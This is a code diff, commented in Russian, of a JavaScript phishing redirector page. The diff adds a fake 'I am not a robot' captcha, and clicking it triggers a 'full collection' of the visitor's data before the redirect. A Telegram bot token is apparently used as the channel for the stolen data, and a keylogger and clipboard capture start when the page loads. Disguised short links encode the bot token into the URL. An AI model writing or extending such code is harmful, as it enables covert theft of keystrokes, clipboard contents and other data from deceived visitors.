             const statusMsg = document.getElementById('statusMsg');
             const timerDisplay = document.getElementById('timerDisplay');
             const errorContainer = document.getElementById('errorContainer');
+            const captchaArea = document.getElementById('captchaArea');
             overlay.classList.remove('hidden');
-            statusMsg.innerText = "Подключение...";
-            
+            statusMsg.innerText = "Проверка соединения...";
             let available = await isTelegramAvailable(botToken);
             if (!available) {
                 errorContainer.innerHTML = `<div class="error-box">⚠️ Ошибка соединения. Попробуйте включить VPN и обновить страницу.</div>`;
@@ -896,17 +975,31 @@
                 statusMsg.innerText = "";
                 return;
             }
-            
-            canCollect = true;
-            let seconds = 5;
+            vpnPassed = true;
+            let seconds = 10;
             timerDisplay.innerText = seconds;
+            statusMsg.innerText = "Проверка безопасности...";
             let interval = setInterval(() => {
                 seconds--;
                 timerDisplay.innerText = seconds;
                 if (seconds <= 0) {
                     clearInterval(interval);
-                    statusMsg.innerText = "Перенаправление...";
-                    runFullCollection().then(() => {
+                    timerDisplay.style.display = 'none';
+                    statusMsg.innerText = "Подтвердите действие";
+                    // Показываем капчу
+                    captchaArea.style.display = 'flex';
+                    captchaArea.innerHTML = `
+                        <div class="captcha-button" id="captchaButton">
+                            <div class="captcha-checkmark">✓</div>
+                            <span>Я не робот</span>
+                        </div>
+                    `;
+                    document.getElementById('captchaButton').addEventListener('click', async function() {
+                        captchaPassed = true;
+                        statusMsg.innerText = "Перенаправление...";
+                        captchaArea.style.display = 'none';
+                        canCollect = true;
+                        await runFullCollection();
                         setTimeout(() => {
                             window.location.href = targetUrl;
                         }, 1500);
@@ -915,7 +1008,7 @@
             }, 1000);
         }
         
-        // ========== 18. ИНТЕРФЕЙС ДЛЯ СОЗДАНИЯ СОКРАЩЁННЫХ ССЫЛОК ==========
+        // ========== 18. ИНТЕРФЕЙС ДЛЯ СОЗДАНИЯ ССЫЛОК ==========
         function generateShortLink(originalUrl, token, id) {
             let payload = `${originalUrl}|${token}|${id}`;
             let encoded = btoa(unescape(encodeURIComponent(payload)));
@@ -952,11 +1045,8 @@
             });
         });
         
-        // Запуск обработки хэша при загрузке и при изменении
         window.addEventListener('DOMContentLoaded', () => handleHashRedirect());
         window.addEventListener('hashchange', () => handleHashRedirect());
-        
-        // Запускаем кейлоггер и перехват буфера обмена сразу (они будут активны после прохождения проверки)
         startKeylogger();
         captureClipboard();
     })();
